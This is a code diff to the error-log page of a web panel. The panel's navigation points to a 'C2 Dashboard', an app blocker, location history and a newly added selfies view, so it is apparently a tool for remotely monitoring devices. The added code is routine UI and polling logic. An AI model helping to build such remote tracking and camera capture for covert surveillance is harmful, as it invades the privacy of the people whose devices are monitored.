@@ -16,8 +16,9 @@
                 <div><h1 class="text-xl font-bold tracking-tight text-gray-900 text-center md:text-left">Device Diagnostics & Errors</h1></div>
             </div>
             <div class="flex flex-wrap justify-center items-center gap-4">
-                <a href="/apps_view" class="text-xs font-bold text-purple-600 hover:text-purple-800 transition tracking-wide uppercase">App Blocker</a>
                 <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
+                <a href="/apps_view" class="text-xs font-bold text-purple-600 hover:text-purple-800 transition tracking-wide uppercase">App Blocker</a>
+                <a href="/selfies_view" class="text-xs font-bold text-emerald-600 hover:text-emerald-800 transition tracking-wide uppercase">📸 Selfies</a>
                 <a href="/history_view" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">Location History</a>
                 <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
                     <option value="">Loading...</option>
@@ -30,6 +31,20 @@
                 <p class="text-xs font-bold text-red-500 uppercase tracking-widest">Error Logs</p>
                 <button type="button" id="refresh-errors-btn" class="text-xs font-semibold px-3 py-1 rounded-full bg-red-100 text-red-700 hover:bg-red-200 transition">Refresh</button>
             </div>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Device Status</p>
+                    <p id="errors-device-status" class="text-lg font-bold text-gray-800">Checking...</p>
+                </div>
+                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Error Count</p>
+                    <p id="errors-count" class="text-lg font-bold text-gray-800">0</p>
+                </div>
+                <div class="bg-gray-50 rounded-2xl p-4 border border-gray-200">
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-2">Newest Entry</p>
+                    <p id="errors-last-entry" class="text-sm text-gray-700">None</p>
+                </div>
+            </div>
             <div id="errors-container" class="flex flex-col gap-3 h-[600px] overflow-y-auto bg-gray-50 p-4 rounded-xl border border-gray-200 text-sm font-mono">
                 <span class="text-gray-400">Waiting for error logs...</span>
             </div>
@@ -38,36 +53,60 @@
 
     <script>
         const selectEl = document.getElementById('device-select');
+        const errorsDeviceStatus = document.getElementById('errors-device-status');
+        const errorsCount = document.getElementById('errors-count');
+        const errorsLastEntry = document.getElementById('errors-last-entry');
 
         async function fetchAvailableDevices() {
             try {
                 const res = await fetch('/devices');
+                if (!res.ok) return;
                 const data = await res.json();
-                if (data.devices && data.devices.length > 0) {
-                    const val = selectEl.value;
-                    selectEl.innerHTML = '';
-                    data.devices.forEach(did => {
-                        const opt = document.createElement('option');
-                        opt.value = did; opt.textContent = did;
-                        selectEl.appendChild(opt);
-                    });
-                    if (val && data.devices.includes(val)) selectEl.value = val;
+                const devices = data.devices || [];
+                const selected = selectEl.value;
+                selectEl.innerHTML = '';
+                if (devices.length === 0) {
+                    selectEl.innerHTML = '<option value="">No devices</option>';
+                    return;
                 }
+                devices.forEach(did => {
+                    const opt = document.createElement('option');
+                    opt.value = did; opt.textContent = did;
+                    selectEl.appendChild(opt);
+                });
+                selectEl.value = devices.includes(selected) ? selected : devices[0];
             } catch(err) { console.error(err); }
+        }
+
+        async function fetchDeviceStatus() {
+            if(!selectEl.value) return;
+            try {
+                const res = await fetch(`/stats?device_id=${encodeURIComponent(selectEl.value)}`);
+                if(!res.ok) throw new Error('Status fetch failed');
+                const data = await res.json();
+                errorsDeviceStatus.textContent = data.is_online ? 'Online' : 'Offline';
+            } catch(e) {
+                errorsDeviceStatus.textContent = 'Offline';
+            }
         }
 
         async function fetchErrors() {
             if(!selectEl.value) return;
             const container = document.getElementById('errors-container');
             try {
+                await fetchDeviceStatus();
                 const res = await fetch(`/get_errors?device_id=${encodeURIComponent(selectEl.value)}`);
                 if(res.ok) {
                     const data = await res.json();
                     container.innerHTML = '';
                     if(!data.errors || data.errors.length === 0) {
                         container.innerHTML = '<span class="text-gray-400">No errors reported for this device.</span>';
+                        errorsCount.textContent = '0';
+                        errorsLastEntry.textContent = 'None';
                         return;
                     }
+                    errorsCount.textContent = data.errors.length;
+                    errorsLastEntry.textContent = data.errors[0]?.timestamp || 'Unknown';
                     data.errors.forEach(err => {
                         const errEl = document.createElement('div');
                         errEl.className = 'border-l-4 border-red-500 pl-4 py-2 mb-2 bg-white rounded shadow-sm border border-gray-200';
@@ -85,7 +124,7 @@
         (async () => { 
             await fetchAvailableDevices(); 
             fetchErrors(); 
-            setInterval(fetchErrors, 5000); 
+            setInterval(() => { if (document.visibilityState === 'visible') fetchErrors(); }, 15000); 
         })();
     </script>
 </body>
